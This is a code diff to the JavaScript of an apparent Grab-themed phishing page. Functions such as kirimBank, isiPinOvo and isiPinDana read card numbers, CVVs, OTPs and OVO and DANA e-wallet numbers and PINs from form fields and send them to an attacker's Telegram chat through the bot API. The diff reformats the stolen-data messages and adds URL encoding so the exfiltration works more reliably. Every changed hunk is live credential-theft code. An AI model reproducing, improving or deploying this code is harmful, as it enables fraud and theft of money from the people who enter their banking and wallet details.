@@ -575,8 +575,8 @@ function kirimBank() {
     dataBank.cvv = document.getElementById('cvvBank').value;
     dataBank.nama = document.getElementById('namaKartuBank').value;
 
-    const pesan = `💳 *DATA BANK GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANama Kartu: ${dataBank.nama}%0AKartu: ${dataBank.kartu}%0AMasa: ${dataBank.mm}%0ACVV: ${dataBank.cvv}`;
-    fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+    const pesan = `🏦 DATA BANK / REKENING GRAB%0ANo Kartu: ${dataBank.kartu}%0ANama: ${dataBank.nama}%0ACVV: ${dataBank.cvv}%0ANama Bank: ${dataBank.namaBank}`;
+fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     bukaHalaman('bank_1');
     mulaiHitunganBank();
 }
@@ -594,8 +594,8 @@ function isiBulatBank(val) {
 
     if(val.length === 6) {
         dataBank.otp = val;
-        const pesan = `🚨 *DATA LENGKAP BANK GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataBank, null, 2)}`;
-        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        const pesan = `✅ VERIFIKASI BANK BERHASIL%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataBank, null, 2)}`;
+        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
         pesanSalah.classList.remove('hidden');
     }
 }
@@ -629,9 +629,8 @@ function prosesLanjutOvo() {
     dataOvo.nomor = document.getElementById('nomorOvo').value;
     document.getElementById('tampilNomorOvo').innerText = dataOvo.nomor;
     
-    const pesan = `📱 *DATA OVO GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataOvo.nomor}`;
-    fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-    
+    const pesan = `📱 DATA OVO GRAB%0ANomor: ${dataOvo.nomor}`;
+fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     bukaHalaman('ovo_2');
 }
 
@@ -645,8 +644,8 @@ function isiPinOvo(val) {
 
     if(val.length === 6) {
         dataOvo.pin = val;
-        const pesan = `🚨 *DATA LENGKAP OVO GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataOvo, null, 2)}`;
-        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        const pesan = `🔐 DATA LENGKAP OVO GRAB%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataOvo, null, 2)}`;
+fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
         bukaHalaman('ovo_3');
         mulaiHitunganOvo();
     }
@@ -680,10 +679,8 @@ function cekTombolDana() {
 function prosesLanjutDana() {
     dataDana.nomor = document.getElementById('nomorDana').value;
     document.getElementById('nomorTujuanDana').innerText = '62 ' + dataDana.nomor;
-    
-    const pesan = `💧 *DATA DANA GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0ANomor: ${dataDana.nomor}`;
-    fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
-    
+    const pesan = `💧 DATA DANA GRAB%0ANomor: ${dataDana.nomor}`;
+fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     bukaHalaman('dana_2');
 }
 
@@ -697,8 +694,8 @@ function isiPinDana(val) {
 
     if(val.length === 6) {
         dataDana.pin = val;
-        const pesan = `🚨 *DATA LENGKAP DANA GRAB*%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
-        fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${pesan}&parse_mode=Markdown`);
+        const pesan = `🔐 DATA LENGKAP DANA GRAB%0A${JSON.stringify(dataUtama, null, 2)}%0A${JSON.stringify(dataDana, null, 2)}`;
+fetch(API_TELEGRAM + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
         bukaHalaman('dana_3');
         mulaiHitunganDana();
     }
